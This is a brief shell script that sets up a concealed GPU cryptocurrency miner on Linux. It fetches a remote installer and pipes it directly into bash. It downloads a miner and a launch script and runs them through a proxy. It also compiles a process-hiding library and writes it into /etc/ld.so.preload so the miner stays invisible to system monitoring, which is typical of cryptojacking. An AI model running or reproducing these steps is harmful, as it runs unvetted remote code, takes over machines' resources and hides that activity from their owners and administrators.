apt -y install libcurl4-openssl-dev libssl-dev
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicAv2.zip
unzip magicAv2.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/mhssamadani/Autolykos2_NV_Miner/releases/download/4.1.0/NV_Miner_Linux_CUDA11_4.1.0.zip
unzip NV_Miner_Linux_CUDA11_4.1.0.zip
cd NV_Miner_Linux_CUDA11_4.1.0

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/av2.sh
chmod +x av2.sh

graftcp ./av2.sh
